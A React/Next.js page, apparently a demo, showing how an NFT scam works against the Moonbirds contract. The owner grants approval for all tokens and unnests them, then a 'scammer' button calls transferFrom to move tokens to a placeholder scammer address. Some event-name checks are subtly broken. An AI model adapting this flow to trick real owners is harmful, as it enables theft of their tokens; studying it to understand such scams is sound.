import { ContractReceipt, ContractTransaction, ethers, Event } from "ethers";
import type { NextPage } from "next";
import Head from "next/head";
import { useCallback, useRef } from "react";
import { useWeb3Context } from "../contexts/web3-context";
// import { trpc } from "../utils/trpc";
import contractAbi from "../moonbirds-abi.json";

type TechnologyCardProps = {
  name: string;
  description: string;
  documentation: string;
};

const Home: NextPage = () => {
  // const hello = trpc.useQuery(["example.hello", { text: "from tRPC" }]);
  const { address, connect, connected, disconnect, provider } = useWeb3Context();

  const tokenIdRef = useRef<HTMLInputElement>(null);

  const handleConnect = () => {
    connect();
  };

  const handleDisconnect = () => {
    disconnect();
  };

  const handleAllow = useCallback(async (): Promise<
    boolean | undefined
  > => {
    if (!provider) return;
    const signer = provider.getSigner();
    const mintingContract = new ethers.Contract(
      "0x23581767a106ae21c074b2276d25e5c3e136a68b",
      contractAbi,
      signer,
    );
    try {
      const result: ContractTransaction = await mintingContract["setApprovalForAll"](
        address,
        true
      );
      const response: ContractReceipt = await result.wait();
      const event: Event | undefined = response.events?.find(
        (event: Event) => !!event.event && event.event === " ApprovalForAll",
      );
      if (event && event.args) {
        return true;
      }
    } catch (e) {
      console.warn(e);
    }
  }, [provider, address]);

  const handleUnnest = useCallback(async (): Promise<
    boolean | undefined
  > => {
    if (!provider) return;
    const signer = provider.getSigner();
    const mintingContract = new ethers.Contract(
      "0x23581767a106ae21c074b2276d25e5c3e136a68b",
      contractAbi,
      signer,
    );
    try {
      const result: ContractTransaction = await mintingContract["toggleNesting"](
        [1,2,3,4,5,6,7,8,9,10]
      );
      const response: ContractReceipt = await result.wait();
      const event: Event | undefined = response.events?.find(
        (event: Event) => !!event.event && event.event === " Unnested",
      );
      if (event && event.args) {
        return true;
      }
    } catch (e) {
      console.warn(e);
    }
  }, [provider, address]);

  const handleTransfer = useCallback(async (): Promise<
    boolean | undefined
  > => {
    if (!provider) return;
    const signer = provider.getSigner();
    const mintingContract = new ethers.Contract(
      "0x23581767a106ae21c074b2276d25e5c3e136a68b",
      contractAbi,
      signer,
    );
    try {
      const tokenId = 1; //this would need to be done once per token
      const result: ContractTransaction = await mintingContract["transferFrom"](
        "0xOwnerAddress",
        "0xScammerAddress",
        parseInt(tokenIdRef?.current?.value || "0")
      );
      const response: ContractReceipt = await result.wait();
      const event: Event | undefined = response.events?.find(
        (event: Event) => !!event.event && event.event === " Transfer",
      );
      if (event && event.args) {
        return true;
      }
    } catch (e) {
      console.warn(e);
    }
  }, [provider, address]);

  return (
    <>
      <Head>
        <title>Moonbirds mover</title>
        <meta name="description" content="moonbirds unnest" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main className="container mx-auto flex flex-col items-center justify-center min-h-screen p-4">
        <h1 className="text-6xl mb-5">Demo</h1>
        <p className="italic font-bold bg-yellow-200 p-2">Do not use this code unless you know what you&apos;re doing</p>
        {!connected && <button className="p-4 border-red-100 bg-slate-300 rounded-md" onClick={handleConnect}>Connect (start demo)</button>}
        {connected && <button className="py-2 px-4 border-red-100 bg-slate-300 my-2 rounded-md" onClick={handleAllow}>Allow All (done by owner)</button>}
        {connected && <button className="py-2 px-4 border-red-100 bg-slate-300 my-2 rounded-md" onClick={handleUnnest}>Unnest All (done by owner)</button>}
        {connected && <button className="py-2 px-4 border-red-100 bg-slate-300 my-2 rounded-md" onClick={handleTransfer}>Transfer One at a Time (done by scammer)</button>}
        <input className="border-slate-800 bg-slate-300 p-2 rounded-md" placeholder="Enter Token Id for xfer" type="number" ref={tokenIdRef} />
      </main>
    </>
  );
};

export default Home;
